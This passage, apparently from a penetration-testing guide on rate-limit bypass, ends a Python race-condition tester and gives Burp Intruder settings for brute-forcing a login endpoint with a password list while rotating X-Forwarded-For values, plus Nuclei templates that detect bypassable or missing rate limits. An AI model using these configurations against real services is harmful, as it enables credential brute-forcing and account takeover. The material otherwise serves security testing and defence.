      parser.add_argument("-X", "--method", default="POST", help="HTTP method")
      parser.add_argument("-d", "--data", help="Request body")
      parser.add_argument("-H", "--header", action="append", help="Extra headers (key:value)")
      parser.add_argument("-t", "--threshold", type=int, default=20, help="Rate limit threshold to test")
      parser.add_argument("--threads", type=int, default=10, help="Concurrent threads for race condition")
      args = parser.parse_args()
      
      headers = {"Content-Type": "application/json"}
      if args.header:
          for h in args.header:
              key, val = h.split(":", 1)
              headers[key.strip()] = val.strip()
      
      tester = RateLimitBypass(
          url=args.url,
          method=args.method,
          data=args.data,
          headers=headers,
          threshold=args.threshold,
          threads=args.threads
      )
      tester.run_all_tests()

  if __name__ == "__main__":
      main()
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Burp Extension"}
  ```txt [Burp Suite Setup]
  # Manual Burp Suite configuration for rate limit testing:

  # 1. Match & Replace Rules (auto-rotate IP):
  Proxy → Options → Match and Replace → Add:
    Type: Request Header
    Match: ^X-Forwarded-For:.*$
    Replace: X-Forwarded-For: 10.0.RANDOM.RANDOM
    Regex: true

  # 2. Intruder Attack Configuration:
  Target: POST /api/login
  Positions:
    - Password field: §password§
    - X-Forwarded-For: §ip§

  Attack Type: Pitchfork
  Payload Set 1: passwords.txt
  Payload Set 2: Sequential numbers (for IP generation)
  
  Resource Pool: 50 concurrent requests

  # 3. Extensions to Install:
  - IP Rotate (BApp Store)
  - Rate Limit Bypass (custom)
  - Turbo Intruder
  - Param Miner

  # 4. Turbo Intruder Configuration:
  # See Race Condition section for scripts
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Nuclei Templates"}
  ::code-collapse
  ```yaml [rate-limit-bypass.yaml]
  id: rate-limit-header-bypass

  info:
    name: Rate Limit Bypass via X-Forwarded-For
    author: security-researcher
    severity: medium
    description: Tests if rate limiting can be bypassed using IP spoofing headers
    tags: rate-limit,bypass,brute-force

  http:
    - raw:
        - |
          POST {{Path}} HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/json
          X-Forwarded-For: {{randstr}}.{{randstr}}.{{randstr}}.{{randstr}}

          {"email":"test@test.com","password":"wrong_password"}

      matchers-condition: and
      matchers:
        - type: status
          status:
            - 200
            - 401
            - 403
          condition: or

        - type: word
          words:
            - "invalid"
            - "incorrect"
            - "wrong"
            - "failed"
          condition: or
          part: body

      # If we get normal error (not 429), rate limit is bypassed

  ---

  id: rate-limit-no-protection

  info:
    name: No Rate Limiting Detected
    author: security-researcher
    severity: low
    description: Endpoint has no rate limiting protection
    tags: rate-limit,missing,brute-force

  http:
    - raw:
        - |
          POST {{Path}} HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/json

          {"email":"test@test.com","password":"wrong"}

      matchers:
        - type: status
          negative: true
          status:
            - 429

      # Run multiple times. If never 429, no rate limit exists.
  ```
  ::
  :::
::

---

## References & Resources

::card-group
  ::card
  ---
  title: HackTricks - Rate Limit Bypass
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/pentesting-web/rate-limit-bypass.html
  target: _blank
  ---
  Comprehensive rate limit bypass techniques including header manipulation, parameter pollution, endpoint variation, and race conditions.
  ::

  ::card
  ---
  title: PayloadsAllTheThings - Rate Limit
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Rate%20Limit
  target: _blank
  ---
  Curated collection of rate limit bypass payloads and techniques from the PayloadsAllTheThings repository.
  ::

  ::card
  ---
  title: OWASP - Blocking Brute Force
  icon: i-lucide-shield-check
  to: https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks
  target: _blank
  ---
  OWASP's guide on blocking brute force attacks, including rate limiting best practices and common implementation flaws.
  ::

  ::card
  ---
  title: PortSwigger - Race Conditions
  icon: i-lucide-graduation-cap
  to: https://portswigger.net/web-security/race-conditions
  target: _blank
  ---
  Interactive labs for practicing race condition attacks including single-packet attacks and HTTP/2 desync techniques for rate limit bypass.
  ::

  ::card
  ---
  title: PortSwigger - HTTP Request Smuggling
  icon: i-lucide-graduation-cap
  to: https://portswigger.net/web-security/request-smuggling
  target: _blank
  ---
  Comprehensive guide on request smuggling techniques that can bypass front-end rate limiters by desynchronizing front-end and back-end servers.
  ::

  ::card
  ---
  title: Turbo Intruder
  icon: i-simple-icons-github
  to: https://github.com/PortSwigger/turbo-intruder
  target: _blank
  ---
  Burp Suite extension for sending large numbers of HTTP requests with extreme speed. Essential for race condition and rate limit testing.
  ::

  ::card
  ---
  title: Cloudflare Rate Limiting Docs
  icon: i-lucide-cloud
  to: https://developers.cloudflare.com/waf/rate-limiting-rules/
  target: _blank
  ---
  Official Cloudflare documentation on rate limiting rules, understanding how CDN-level rate limiting works and its potential bypass vectors.
  ::

  ::card
  ---
  title: Nginx Rate Limiting
  icon: i-lucide-server
  to: https://www.nginx.com/blog/rate-limiting-nginx/
  target: _blank
  ---
  How Nginx implements rate limiting using limit_req module. Understanding the implementation helps identify bypass vectors.
  ::

  ::card
  ---
  title: API Rate Limiting Best Practices
  icon: i-lucide-file-text
  to: https://cloud.google.com/architecture/rate-limiting-strategies-techniques
  target: _blank
  ---
  Google Cloud's guide on rate limiting strategies including token bucket, leaky bucket, fixed window, and sliding window algorithms.
  ::

  ::card
  ---
  title: Real-World Rate Limit Bypass Reports
  icon: i-lucide-bug
  to: https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPBRUTE.md
  target: _blank
  ---
  Collection of real HackerOne bug bounty reports involving rate limit bypass and brute force vulnerabilities with full details and payouts.
  ::

  ::card
  ---
  title: HTTP/2 Single Packet Attack Research
  icon: i-lucide-flask-conical
  to: https://portswigger.net/research/smashing-the-state-machine
  target: _blank
  ---
  PortSwigger research on "Smashing the state machine" — the single-packet attack technique that sends multiple HTTP/2 requests in one TCP packet for race conditions.
  ::

  ::card
  ---
  title: IP Rotate Burp Extension
  icon: i-lucide-wrench
  to: https://github.com/RhinoSecurityLabs/IPRotate_Burp_Extension
  target: _blank
  ---
  Burp Suite extension that routes traffic through AWS API Gateway for automatic IP rotation on every request, bypassing IP-based rate limits.
  ::
::